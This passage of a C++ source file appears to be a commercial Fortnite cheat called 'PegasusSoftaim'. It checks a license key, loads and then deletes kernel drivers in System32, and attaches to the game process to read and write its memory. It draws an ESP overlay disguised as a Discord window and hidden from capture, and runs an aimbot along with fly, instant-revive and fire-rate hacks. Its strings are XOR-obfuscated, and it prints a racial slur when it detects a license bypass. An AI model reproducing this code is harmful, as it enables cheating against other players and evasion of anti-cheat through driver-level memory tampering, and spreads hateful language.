		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("linesp").c_str());
	}

	if (Settings::cross_hair)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("crosshair").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("crosshair").c_str());
	}

	WriteStringToIni(std::to_string(Settings::AimFOV), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimfov").c_str());
	WriteStringToIni(std::to_string(Settings::Aim_Speed), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("smooth").c_str());
	WriteStringToIni(std::to_string(Settings::VisDist), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("espdist").c_str());
	WriteStringToIni(std::to_string(Settings::Esp_Corner_Box), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("cornerboxthick").c_str());
	WriteStringToIni(std::to_string(Settings::Esp_line), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("esplinethick").c_str());

}

void LoadConfig()
{
	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimbot").c_str()) == _xor_("1").c_str())
	{
		Settings::Aimbot = true;
	}
	else
	{
		Settings::Aimbot = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimbotpred").c_str()) == _xor_("1").c_str())
	{
		Settings::Aim_Prediction = true;
	}
	else
	{
		Settings::Aim_Prediction = false;;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("SkipKnocked").c_str()) == _xor_("1").c_str())
	{
		Settings::SkipKnocked = true;
	}
	else
	{
		Settings::SkipKnocked = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("controller").c_str()) == _xor_("1").c_str())
	{
		Settings::Controller = true;
	}
	else
	{
		Settings::Controller = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("controller").c_str()) == _xor_("1").c_str())
	{
		Settings::Controller = true;
	}
	else
	{
		Settings::Controller = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("drawfov").c_str()) == _xor_("1").c_str())
	{
		Settings::FOVMode = true;
	}
	else
	{
		Settings::FOVMode = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("box").c_str()) == _xor_("1").c_str())
	{
		Settings::Esp_box = true;
	}
	else
	{
		Settings::Esp_box = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("boxfill").c_str()) == _xor_("1").c_str())
	{
		Settings::Esp_box_fill = true;
	}
	else
	{
		Settings::Esp_box_fill = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("cornerbox").c_str()) == _xor_("1").c_str())
	{
		Settings::Esp_Corner_Box = true;
	}
	else
	{
		Settings::Esp_Corner_Box = false;
	}

	if (ReadStringFromIni(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("skel").c_str()) == _xor_("1").c_str())
	{
		Settings::skeleton = true;
	}
	else
	{
		Settings::skeleton = false;
	}

	




	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimfov").c_str(), 4);
	Settings::AimFOV = SavedAimFOV;

	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("smooth").c_str(), 5);
	Settings::Aim_Speed = SavedAimSmoothness;

	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("espdist").c_str(), 6);
	Settings::VisDist = SavedESPDis;


	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("cornerboxthick").c_str(), 8);
	Settings::Esp_Corner_Box = SavedEsp_Corner_Box;

	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("esplinethick").c_str(), 9);
	Settings::Esp_line = SavedEsp_Line;

	/*
	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\ghostaim.config").c_str(), _xor_("options").c_str(), _xor_("aimfov").c_str(), 4);
	Settings::AimFOV = SavedAimFOV;
	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\ghostaim.config").c_str(), _xor_("options").c_str(), _xor_("smooth").c_str(), 5);
	Settings::AimSmooth = SavedAimSmoothness;
	ReadStringFromIni_Float(_xor_("C:\\ProgramData\\ghostaim.config").c_str(), _xor_("options").c_str(), _xor_("distanceslider").c_str(), 6);
	Settings::VisDist = new_aimdistance;
	*/
}
int main(int argc, const char* argv[])
{
	system(_xor_("start https://pegasuscheats.vip").c_str());
	system(_xor_("start https://discord.gg/Y3Se3kU4nj").c_str());

	Protections();
	Beep(500, 500);
	std::cout << _xor_("\n\n");
	std::cout << setw(40);
	Slow("Welcome to PegasusSoftaim!", 150);
	std::cout << _xor_("\n\n");
	std::cout << setw(43);
	Slow("Loading...", 150);
KeyAuthApp.init();
	if (!KeyAuthApp.data.success)
	{

		std::cout << "\n Status: " + KeyAuthApp.data.message;
		LI_FN(Sleep)(1500);
		LI_FN(exit)(0);
	}
	system(_xor_("cls").c_str());




	std::string username;
	std::string password;
	std::string key;


	{
		slow_print(_xor_(" Enter license Key -> ").c_str(), 75);
		std::cin >> key;
		KeyAuthApp.license(key);







		;
	}

	if (!KeyAuthApp.data.success)
	{
		std::cout << "\n Status: " + KeyAuthApp.data.message;
		LI_FN(Sleep)(1500);
		LI_FN(exit)(0);
	}

	if (KeyAuthApp.data.ip == "1.1.1.1")
	{
		printf(_xor_("nice bypass nigger").c_str());
		LI_FN(exit)(-1);

	}
	if (KeyAuthApp.data.username == "")
	{
		printf(_xor_("nice bypass nigger").c_str());
		LI_FN(exit)(-1);
	}
	if (KeyAuthApp.data.username == "hecker")
	{
		printf(_xor_("nice bypass nigger").c_str());
		LI_FN(exit)(-1);
	}


	system(_xor_("cls").c_str());


	Sleep(5000);
	Beep(500, 500);

	MessageBoxW(0, L"[+] Click 'OK' when Ready to load Drivers!", L"[PegasusSoftaim]", MB_OK);
	Driver1();
	system(_xor_("cls").c_str());

	//system(_xor_("start C:\\Windows\\System32\\sadwdsa.exe C:\\Windows\\System32\\dr1sadu.sys").c_str());

	//system(_xor_("C:\\Windows\\System32\\dr1ve2.sys").c_str());
	//LI_FN(Sleep)(5000);
	//system(_xor_("start C:\\Windows\\System32\\sadwdsa.exe C:\\Windows\\System32\\dri5e2.sys").c_str());
	//LI_FN(Sleep)(5000);

	remove(_xor_("C:\\Windows\\System32\\dr1sadu.sys").c_str());
	remove(_xor_("C:\\Windows\\System32\\dr1ve2.sys").c_str());
	remove(_xor_("C:\\Windows\\System32\\driv532e2.exe").c_str());
	remove(_xor_("C:\\Windows\\System32\\dri5e2.sys").c_str());
	remove(_xor_("C:\\Windows\\System32\\driv532e2.exe").c_str());

	system(_xor_("cls").c_str());
	MessageBoxW(0, L"[+] Injected!", L"[PEGASUSCHEAT]", MB_OK);
	std::cout << _xor_("\n\n");
	Beep(500, 500);
	std::cout << setw(43);
	Slow("PegasusCheats | [+] Start Fortnite", 150);

	while (hwnd == NULL)
	{
		RandomProcess();

		hwnd = FindWindowA(0, _xor_("Fortnite  ").c_str());

		LI_FN(Sleep)(250);
	}

	//GetWindowThreadProcessId(hwnd, &processID);

	if (driver->Init(FALSE))
	{
		driver->Attach(_xor_(L"FortniteClient-Win64-Shipping.exe").c_str());
		//driver->Attach(_xor_(L"Discord.exe").c_str());

		base_address = driver->GetModuleBase(_xor_(L"FortniteClient-Win64-Shipping.exe").c_str());
		//base_address = driver->GetModuleBase(_xor_(L"Discord.exe").c_str());

		processID = get_fn_processid();
		//processID = GetProcessId((L"Discord.exe"));

		if (!processID)
		{
			std::cout << _xor_("\n PegasusCheats | [-] Could not inject properly.").c_str();
			system(_xor_("pause").c_str());
			exit(0);
		}

		RECT rect;
		if (GetWindowRect(hwnd, &rect))
		{
			Width = rect.right - rect.left;
			Height = rect.bottom - rect.top;
		}

		info_t Input_Output_Data;
		Input_Output_Data.pid = processID;
		unsigned long int Readed_Bytes_Amount;

		SetWindowLong(Window, GWL_EXSTYLE, WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW);
	}

	//HWND ass = FindWindowA(nullptr, _xor_("WinRAR").c_str());
	//DWORD assid = 0;
	//GetWindowThreadProcessId(ass, &assid);


	system(_xor_("cls").c_str());
	std::cout << _xor_("\n\n");
	std::cout << setw(40);
	Slow("PegasusCheat Injected!", 150);
	std::cout << _xor_("\n");
	std::cout << setw(38);
	Slow("Do not close this tab!", 150);
	LI_FN(Sleep)(2000);

	system(_xor_("cls").c_str());

	rpm();

	CreateThread(NULL, NULL, maintabshread, NULL, NULL, NULL);
	//GetWindowThreadProcessId(hwnd, &processID);

	system(_xor_("C:\\Users\\Administrator\\AppData\\Local\\Discord\\app-1.0.9004\\Discord.exe").c_str());
	MessageBoxW(0, L"[+] Do not close Discord!", L"[PegasusSoftaim]", MB_ICONWARNING);
	HWND overlay = FindWindowA(nullptr, _xor_("xxx????xxxx").c_str());
	//HWND overlay = FindWindowA(nullptr, _xor_("Registry Editor").c_str());
	DWORD overlayid = 0;
	GetWindowThreadProcessId(overlay, &overlayid);

	SetWindowDisplayAffinity(overlay, 1);

	xCreateWindow();

	xInitD3d();
	//HANDLE handle = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(drawLoop), nullptr, NULL, nullptr);

	xMainLoop();
	xShutdown();

	remove(_xor_("C:\\Windows\\System32\\sarweaddsa.exe").c_str());
	remove(_xor_("C:\\Windows\\System32\\sawfsadsa.exe").c_str());
	system(_xor_("cls").c_str());
	return 0;


}

std::wstring s2ws(const std::string& str)
{
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}

int get_fn_processid()
{
	BYTE target_name[] = { 'F','o','r','t','n','i','t','e','C','l','i','e','n','t','-','W','i','n','6','4','-','S','h','i','p','p','i','n','g','.','e','x','e', 0 };
	std::wstring process_name = s2ws(std::string((char*)target_name));
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(entry);

	if (!Process32First(snapshot, &entry)) {
		return 0;
	}

	while (Process32Next(snapshot, &entry)) {
		if (std::wstring(entry.szExeFile) == process_name) {
			return entry.th32ProcessID;
		}
	}

	return 0;
}

void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd) //(overlau)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = L"Discord";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, L"Discord", L"Discord", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}


void xInitD3d()
{
	LPDIRECT3DDEVICE9        g_pd3dDevice;
	D3DPRESENT_PARAMETERS    g_d3dpp;
	LPDIRECT3D9              g_pD3D;

	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;
	//io.Fonts->AddFontFromFileTTF("C:\Windows\Fonts\Debrosee-ALPnL.ttf", 15.f);

	io.Fonts->AddFontFromMemoryCompressedTTF(Test_compressed_data, Test_compressed_size, 18.f);

	ImFontConfig icons_config; icons_config.MergeMode = true; icons_config.PixelSnapH = true;
	static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };
	io.Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 16.0f, &icons_config, icons_ranges);

	io.Fonts->AddFontDefault();


	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);


}
Vector3 AimbotCorrection(float bulletVelocity, float bulletGravity, float targetDistance, Vector3 targetPosition, Vector3 targetVelocity) {
	Vector3 recalculated = targetPosition;
	float gravity = fabs(bulletGravity);
	float time = targetDistance / fabs(bulletVelocity);
	/* Bullet drop correction */
//	float bulletDrop = (gravity / 250) * time * time;
//	recalculated.z += bulletDrop * 120;
	/* Player movement correction */
//	recalculated.x += time * (targetVelocity.x);
//	recalculated.y += time * (targetVelocity.y);
//	recalculated.z += time * (targetVelocity.z);
	return recalculated;
}

double GetCrossDistance(double x1, double y1, double z1, double x2, double y2, double z2) {
	return sqrt(pow((x2 - x1), 2) + pow((y2 - y1), 2));
}

void aimbot(float x, float y, float z) {
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	float ScreenCenterZ = (Depth / 2);
	int AimSpeed = Settings::Aim_Speed;
	float TargetX = 0;
	float TargetY = 0;
	float TargetZ = 0;

	if (x != 0) {
		if (x > ScreenCenterX) {
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX) {
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0) {
		if (y > ScreenCenterY) {
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY) {
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	if (z != 0) {
		if (z > ScreenCenterZ) {
			TargetZ = -(ScreenCenterZ - z);
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ > ScreenCenterZ * 2) TargetZ = 0;
		}

		if (z < ScreenCenterZ) {
			TargetZ = z - ScreenCenterZ;
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ < 0) TargetZ = 0;
		}
	}

	//WriteAngles(TargetX / 3.5f, TargetY / 3.5f, TargetZ / 3.5f);
	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);



	return;
}

//void AimAt(DWORD_PTR entity)
//{
//	uint64_t currentactormesh = read<uint64_t>(entity + 0x318);
//	auto rootHead = GetBoneWithRotation(currentactormesh, Settings::hitbox);
//	Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
//
//	if (rootHeadOut.y != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0)
//	{
//		aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
//	}
//}
//start
void AimAt(DWORD_PTR entity) {
	uint64_t currentactormesh = read<uint64_t>(entity + OFFSETS::Mesh);
	auto rootHead = GetBoneWithRotation(currentactormesh, Settings::hitbox);
	//Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);

	if (Settings::Aim_Prediction) {
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = read<uint64_t>(entity + OFFSETS::RootComponet);
		Vector3 vellocity = read<Vector3>(CurrentActorRootComponent + OFFSETS::Velocity);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) {
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);

			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) {
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
			}
		}
	}
}
void AimAt2(DWORD_PTR entity) {
	uint64_t currentactormesh = read<uint64_t>(entity + OFFSETS::Mesh);
	auto rootHead = GetBoneWithRotation(currentactormesh, Settings::hitbox);

	if (Settings::Aim_Prediction) {
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = read<uint64_t>(entity + OFFSETS::RootComponet);
		Vector3 vellocity = read<Vector3>(CurrentActorRootComponent + OFFSETS::Velocity);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) {
				if (Settings::Lock_Line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ Settings::LockLine[0], Settings::LockLine[1], Settings::LockLine[2], 1.0f }), Settings::Thickness);

				}
			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) {
				if (Settings::Lock_Line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ Settings::LockLine[0], Settings::LockLine[1], Settings::LockLine[2], 1.0f }), Settings::Thickness);
				}
			}
		}
	}
}



void DrawESP() {
	if (Settings::Draw_FOV_Circle) {
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(Settings::AimFOV), ImGui::GetColorU32({ Settings::DrawFOVCircle[0], Settings::DrawFOVCircle[1], Settings::DrawFOVCircle[2], 1.0f }), Settings::Shape);
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(Settings::AimFOV), ImGui::GetColorU32({ Settings::DrawFOVCircle[0], Settings::DrawFOVCircle[1], Settings::DrawFOVCircle[2], 1.0f }), Settings::Shape);
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(Settings::AimFOV), ImGui::GetColorU32({ Settings::DrawFOVCircle[0], Settings::DrawFOVCircle[1], Settings::DrawFOVCircle[2], 1.0f }), Settings::Shape);
	}
	if (Settings::fnesp) {


		ImGui::GetOverlayDrawList()->AddRect(ImVec2(ScreenCenterX - Settings::AimFOV, ScreenCenterY - Settings::AimFOV), ImVec2(ScreenCenterX + Settings::AimFOV, ScreenCenterY + Settings::AimFOV + Settings::Thickness), ImGui::GetColorU32({ 255., 255., 255., 255.f }), 1.0f);
	}






	

	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;
	
	

	for (int i = 0; i < ActorCount; i++)
	{
		uint64_t CurrentActor = read<uint64_t>(AActors + i * OFFSETS::CurrentActor);
		if (read<float>(CurrentActor + OFFSETS::Revivefromdbnotime) != 10) continue;
		uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::Mesh);
		int MyTeamId = read<int>(PlayerState + OFFSETS::TeamId);
		DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + OFFSETS::PlayerState);
		int ActorTeamId = read<int>(otherPlayerState + OFFSETS::TeamId);
		auto entityListCopy = entityList;
		if (MyTeamId == ActorTeamId) continue;
		if (CurrentActor == LocalPawn) continue;

		Vector3 Headpos = GetBoneWithRotation(CurrentActorMesh, 98);
		localactorpos = read<Vector3>(Rootcomp + OFFSETS::LocalActorPos);

		float distance = localactorpos.Distance(Headpos) / 100.f;

		Vector3 bone0 = GetBoneWithRotation(CurrentActorMesh, 0);
		Vector3 bottom = ProjectWorldToScreen(bone0);
		Vector3 Headbox = ProjectWorldToScreen(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));
		Vector3 w2shead = ProjectWorldToScreen(Headpos);

		float BoxHeight = (float)(Headbox.y - bottom.y);
		float BoxWidth = BoxHeight * 0.380f;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottom.y;

		float CornerHeight = abs(Headbox.y - bottom.y);
		float CornerWidth = CornerHeight * 0.75;
			//end
		if (Settings::ADSinAir)
		{
			write<bool>(LocalPawn + OFFSETS::bADSWhileNotOnGround, true);
		}
			if (distance < Settings::VisDist)
			{
				if (Settings::Esp_Corner_Box)
				{

					DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(0, 255, 0, 255), 1.5);

				}

				if (Settings::skeleton) {
					DrawSkeleton(CurrentActorMesh);
				}

			
				if (Settings::Esp_line)
				{

					DrawLine(Width / 2, Height, Headbox.x, Headbox.y, &Col.red, 1.5);

				}
				/*if (Settings::Esp_line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2, 1060), ImVec2(bottom.x, bottom.y), ImGui::GetColorU32({ Settings::LineESP[0], Settings::LineESP[1], Settings::LineESP[2], 1.0f }), 1.0f);
				}*/

			/*	if (Settings::LineESP)
				{

					DrawLine(Width / 2, Height, Headbox.x, Headbox.y, &Col.red, 1.5);

				}*/
				if (Settings::Esp_box_fill) {
					ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(Headbox.x - (CornerWidth / 2), Headbox.y), ImVec2(bottom.x + (CornerWidth / 2), bottom.y), ImColor(0, 0, 0, 125), 0.75f);
				}

				
			

				if (Settings::Esp_box) {
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Headbox.x - (CornerWidth / 2), Headbox.y), ImVec2(bottom.x + (CornerWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::BoxCornerESP[0], Settings::BoxCornerESP[1], Settings::BoxCornerESP[2], 1.0f }), 1.5);
				
				}
			}
			auto isDBNO = (read<char>(CurrentActor + OFFSETS::bIsDBNO) >> 4) & 1;
			if (Settings::Aimbot) {
				auto dx = w2shead.x - (Width / 2);
				auto dy = w2shead.y - (Height / 2);
				auto dist = sqrtf(dx * dx + dy * dy);

				if (dist < Settings::AimFOV && dist < closestDistance) {
					if (Settings::SkipKnocked)
					{
						if (!isDBNO)
						{
					closestDistance = dist;
					closestPawn = CurrentActor;
				}
						else
						{

						}
					}
					else
					{
						closestDistance = dist;
						closestPawn = CurrentActor;
					}
				}
			}
	}

	if (Settings::Watermark)
	{
		char dist[64];
		sprintf_s(dist, "PegasusCheats.vip cracked : shit paste proaids| FPS %.1f FPS", ImGui::GetIO().Framerate);
		ImGui::GetOverlayDrawList()->AddText(ImVec2(8, 15), IM_COL32(82, 18, 131, 255), dist);

	}


	if (Settings::g_carfly) {

		uintptr_t CurrentVehicle = read<DWORD_PTR>(Settings::MajorValues::LocalPawn + 0x2158);

		if (CurrentVehicle) //checks if you are in a vehicle
		{
			write<bool>(CurrentVehicle + 0x668, false); //if in vehicle then it disables vehicle gravity
		}
		else
		{
			write<bool>(CurrentVehicle + 0x668, true); //if not in vehicle then it enables vehicle gravity
		}
	}

	if (Settings::g_instarev) {

		write<float>(Settings::MajorValues::LocalPawn + 0x3f60, .000000000000000000000001);
	}

	if (Settings::g_playerfly) {

		write<float>(Settings::MajorValues::LocalPawn + 0x1ef0, 1000.f);
		write<bool>(Settings::MajorValues::LocalPawn + 0x1ea0 + 0x18, true);
	}



	if (Settings::g_doublepump) {
		uintptr_t CurrentWeapon = read<uintptr_t>(Settings::MajorValues::LocalPawn + 0x790);
		if (CurrentWeapon) {
			write<bool>(CurrentWeapon + 0xf41, true); //AFortWeapon    bIgnoreTryToFireSlotCooldownRestriction    0xf41    bool
		}
	}
	if (Settings::Aimbot)
	{
		if (closestPawn != 0)
		{
			if (Settings::Aimbot && closestPawn && GetAsyncKeyState(hotkeys::aimkey) < 0 or Controller::IsPressingLeftTrigger())
			{
				AimAt(closestPawn);
			}
		}
		else {
			isaimbotting = false;
			AimAt2(closestPawn);
		}
	}
	Sleep(1);
}

void Textcenter(std::string text) {
	auto windowWidth = ImGui::GetWindowSize().x;
	auto textWidth = ImGui::CalcTextSize(text.c_str()).x;

	ImGui::SetCursorPosX((windowWidth - textWidth) * 0.5f);
	ImGui::Text(text.c_str());
}

void render() {
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	if (Settings::cross_hair) {
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 13, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 0.92f, 0.07f, 0.35f, 255.f }), 0.5f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 13, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 0.92f, 0.07f, 0.35f, 255.f }), 0.5f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 13), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 0.92f, 0.07f, 0.35f, 255.f }), 0.5f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 13), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 0.92f, 0.07f, 0.35f, 255.f }), 0.5f);
	}

	//start
	if (ShowMenu)
	{
		ImGui::GetStyle().FrameRounding = 4.0f;
		ImGui::GetStyle().GrabRounding = 4.0f;

		ImVec4* colors = ImGui::GetStyle().Colors;
		colors[ImGuiCol_Text] = ImVec4(0.95f, 0.96f, 0.98f, 1.00f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.36f, 0.42f, 0.47f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImColor(82, 18, 131);//purple change this color code only NEXTGEN!!!!!!
		colors[ImGuiCol_ChildBg] = ImColor(0, 0, 0);//black//ImVec4(0.15f, 0.18f, 0.22f, 1.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
		colors[ImGuiCol_Border] = ImVec4(0.08f, 0.10f, 0.12f, 1.00f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
